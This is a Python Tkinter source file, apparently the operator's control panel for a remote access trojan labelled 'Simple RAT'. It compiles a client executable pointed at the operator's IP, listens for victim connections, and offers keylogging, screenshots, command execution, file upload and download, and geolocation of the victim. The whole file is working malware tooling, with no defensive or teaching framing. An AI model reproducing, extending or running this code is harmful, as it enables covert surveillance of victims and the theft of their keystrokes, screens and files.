#!/usr/bin/python
#-*- coding: utf-8 -*-
#Autor: Luis Angel Ramirez Mendoza
#______________________________________________________________________________________________________________________

from tkinter import *
from tkinter import filedialog as fd
from tkinter import scrolledtext
from tkinter import messagebox
from tkinter import scrolledtext as st
from tkinter import messagebox as mb
import socket,sys,threading,time
import os 
import socket
import platform as pl
import urllib.request
import json
import folium
from geopy.geocoders import Nominatim



def exe():
	global ip, target
	ip = (texto.get())
	search_text = "localhosts"
	replace_text = ip

	with open(r'client.py', 'r') as file:
		data = file.read()
		data = data.replace(search_text, replace_text)

	with open(r'client.py', 'w') as file:
		file.write(data)

	print("Text replaced")

	os.system("start setup.py py2exe")

	print("Proceso terminado.....")

def shell():
	global pub
	root2 = Toplevel()
	root2.geometry("1350x730")
	root2['bg'] = '#080d1f'
	root2.resizable(0,0)

	SERVER_HOST = "0.0.0.0"
	SERVER_PORT = 5003

	BUFFER_SIZE = 500 * 1024

	s = socket.socket()


	s.bind((SERVER_HOST, SERVER_PORT))

	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.listen(5)

	print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")


	client_socket, client_address = s.accept()
	print(f"{client_address[0]}:{client_address[1]} Connected!")

	message = "Hello and Welcome".encode()
	client_socket.send(message)
	r = client_socket.recv(BUFFER_SIZE).decode()
	pub = r.replace('b', '')
	print(pub)
	
	r1 = client_socket.recv(BUFFER_SIZE).decode()
	arq = r1.replace("(","").replace(")","")
	print(arq)
	

	def command1():
		global text_area2
		command = (text_area2.get())
		#client_socket.send(command.encode())
		if command.lower() == "dir":
			client_socket.send(command.encode())
			results = client_socket.recv(BUFFER_SIZE).decode()
			print(results)
			#command = input("Enter the command you wanna execute:")
			text_area.insert("end", str(results))
			command = (text_area2.get())
	

	def command2():
		global text_area2, text_area
		code1= text_area2.get()
		print(code1)
		text_area.insert("end", str(code1))
		#scrolledtext1.insert("end", str(resultado))

	def command3():
		text_area.delete("1.0","end")
	
	def command4():
		command = 'keylogger'
		client_socket.send(command.encode())	

	def command5():
		command = 'send'
		client_socket.send(command.encode())
		r = client_socket.recv(BUFFER_SIZE)
		print(r)
		fecha = time.strftime("%Y-%m-%d_%H%M%S")
		with open(ruta + fecha + "keys2.txt", "wb") as f:
			f.write(r)
		f.close()
		messagebox.showinfo(message="To see the content go to the output folder", title="Keylogger")

	def command6():
		text_area.delete("1.0","end")

	def command7():
		global ruta

		command = 'screenshot'
		client_socket.send(command.encode())
		r = client_socket.recv(BUFFER_SIZE)
		print(r)
		fecha = time.strftime("%Y-%m-%d_%H%M%S")
		with open(ruta + fecha + ".png", "wb") as f:
			f.write(r)
		f.close()
		messagebox.showinfo(message="To see the content go to the output folder", title="screenshot")


	def command8():
		messagebox.showinfo(message="Go to Link: http://127.0.0.1:5000", title="Remote Desktop")
		#os.system("python app.py")




	def command9():
		pass

	def command10():
		global pub
		url = urllib.request.urlopen("http://geolocation-db.com/jsonp/"+ pub)
		data = url.read().decode()
		data = data.split("(")[1].strip(")")
		parsed = json.loads(data)
		latitude = parsed['latitude']
		longitude = parsed['longitude']
		popuptext = "<b>Ubicacion</b>"
		m = folium.Map(location=[latitude, longitude], zoom_start=16)
		folium.Marker(location=[latitude, longitude], popup=popuptext).add_to(m)
		m.save(ruta + 'ubicacion.html')
		os.system(ruta + "ubicacion.html") 

	def command11():
		global text_area3		
		command = 'upload'
		client_socket.send(command.encode())
		r = client_socket.recv(BUFFER_SIZE).decode()
		print(r)
		nombre = (text_area3.get())
		f = open(nombre, "rb")
		content = f.read(BUFFER_SIZE)
		client_socket.send(content)
		f.close()
		messagebox.showinfo(message="The file has been uploaded successfully", title="Upload")

	def command12():
		global text_area3
		command = 'download'
		client_socket.send(command.encode())
		r = client_socket.recv(BUFFER_SIZE).decode()
		print(r)
		nombre = (text_area3.get())
		client_socket.send(nombre.encode())
		r = client_socket.recv(BUFFER_SIZE)
		print(r)
		with open(ruta + nombre, "wb") as f:
			f.write(r)

		f.close()
		messagebox.showinfo(message="The file has successfully downloaded", title="Download")
			



	global text_area2, text_area, text_area3
	Fondo = Label(root2, image=img2)
	Fondo.place(x=850,y=5)

	Fondo2 = Label(root2, image=img3)
	Fondo2.place(x=850,y=250)

	Fondo3 = Label(root2, image=img4)
	Fondo3.place(x=50,y=5)

	Fondo4 = Label(root2, image=img10)
	Fondo4.place(x=15,y=480, width = 320, height = 240)

	Fondo5 = Label(root2, image=img13)
	Fondo5.place(x=850,y=490)

	Fondo6 = Label(root2, image=img17)
	Fondo6.place(x=350,y=490)

	Fondo7 = Label(root2, image=img18)
	Fondo7.place(x=900,y=535,  width = 219, height = 73)



	text_area2 = Entry(root2, font=("Arial", 10, "bold"), bg='#080d1f', fg="#fff")
	text_area2.place(x=220,y=80,width = 150, height = 30)

	text_area3 = Entry(root2, font=("Arial", 10, "bold"), bg='#080d1f', fg="#fff")
	text_area3.place(x=920,y=566,width = 150, height = 30)

		
	text_area = scrolledtext.ScrolledText(root2, width = 83, height = 15, font = ("Arial", 10, "bold"),bg='#080d1f', fg="#fff")  
	text_area.grid(column = 0, pady = 200, padx = 100)
	text_area.focus()


	boton4=Button(root2,command=command1, image=img5, bd=0, relief="flat")
	boton4.place(x=550,y=35, width = 149, height = 57)
	boton5=Button(root2,command=command3, image=img6, bd=0, relief="flat")
	boton5.place(x=550,y=105, width = 149, height = 57)

	boton6=Button(root2,command=command4, image=img7, bd=0, relief="flat")
	boton6.place(x=940,y=55, width = 149, height = 57)
	boton7=Button(root2,command=command5, image=img8, bd=0, relief="flat")
	boton7.place(x=1110,y=55, width = 149, height = 57)
	boton8=Button(root2,command=command6, image=img9, bd=0, relief="flat")
	boton8.place(x=1020,y=125, width = 149, height = 57)

	boton9=Button(root2,command=command7, image=img11, bd=0, relief="flat")
	boton9.place(x=940,y=295, width = 149, height = 57)
	boton10=Button(root2,command=command8, image=img12, bd=0, relief="flat")
	boton10.place(x=1110,y=295, width = 149, height = 57)
	boton11=Button(root2,command=command9, image=img9, bd=0, relief="flat")
	boton11.place(x=1020,y=365, width = 149, height = 57)


	boton12=Button(root2,command=command10, image=img14, bd=0, relief="flat")
	boton12.place(x=920,y=610, width = 149, height = 57)
	boton13=Button(root2,command=command11, image=img15, bd=0, relief="flat")
	boton13.place(x=1160,y=535, width = 149, height = 57)
	boton14=Button(root2,command=command12, image=img16, bd=0, relief="flat")
	boton14.place(x=1160,y=615, width = 149, height = 57)




	Fondo4 = Label(root2, text='Ip publica: '+ pub , font=('Arial', 12 ), bg='#000', fg="#fff")
	Fondo4.place(x=450,y=550)
	Fondo5 = Label(root2, text= 'Aquitectura: ' + arq , font=('Arial', 12 ), bg='#000', fg="#fff")
	Fondo5.place(x=450,y=610)



	

	








##############################################################################################	
global ruta 

ruta = os.getcwd() + "/output/"

root = Tk()
root.title("Simple RAT")
root.geometry("500x220")
root['bg'] = '#2A2A2A'
root.resizable(0,0) 


img2 = PhotoImage(file = r"icon/keylogger.png")
img3 = PhotoImage(file = r"icon/screenshot.png")
img4 = PhotoImage(file = r"icon/consola.png")
img5 = PhotoImage(file= r"icon/send.png")
img6 = PhotoImage(file= r"icon/clear.png")
img7 = PhotoImage(file= r"icon/activar.png")
img8 = PhotoImage(file= r"icon/desactivar.png")
img9 = PhotoImage(file= r"icon/stop.png")
img10 = PhotoImage(file= r"icon/anime3.png")
img11 = PhotoImage(file = r"icon/screenshot1.png")
img12 = PhotoImage(file = r"icon/video.png")
img13 = PhotoImage(file = r"icon/others.png")
img14 = PhotoImage(file = r"icon/geo.png")
img15 = PhotoImage(file = r"icon/file.png")
img16 = PhotoImage(file = r"icon/dow.png")
img17 = PhotoImage(file = r"icon/information.png")
img18 = PhotoImage(file = r"icon/name.png")


etiqueta=Label(root,text='Digite la ip', font=('Arial', 14 ), bg='#2A2A2A', fg="#fff")
etiqueta.place(x=80,y=20)


#caja de texto1
texto = Entry(root, text="localhost", font=('Arial', 12 ), bg='#fff')
texto.place(x=200,y=20,width = 200, height = 30)
texto.insert(0, "localhost")

#texto.config(font=("Consolas",12),)

#boton 1
photo = PhotoImage(file = r"icon/exe.png") 
  
photoimage = photo.subsample(8, 8) 
boton=Button(root,text='Crear .exe',command=exe, width=80, height=80, anchor="center", font=('Arial', 12 ), image = photoimage)
boton.place(x=40,y=100)


#boton 2
photo2 = PhotoImage(file = r"icon/programacion.png") 
  
photoimage2 = photo2.subsample(8, 8)
boton=Button(root,text='Comandos',command=shell, width=80, height=80, anchor="center", font=('Arial', 12 ),  image = photoimage2)
boton.place(x=210,y=100)

photo3 = PhotoImage(file = r"icon/salida.png") 
  
photoimage3 = photo3.subsample(8, 8)

boton=Button(root,text='Salir',command=root.destroy, width=80, height=80, anchor="center", font=('Arial', 12 ),  image = photoimage3)
boton.place(x=370,y=100)

root.mainloop()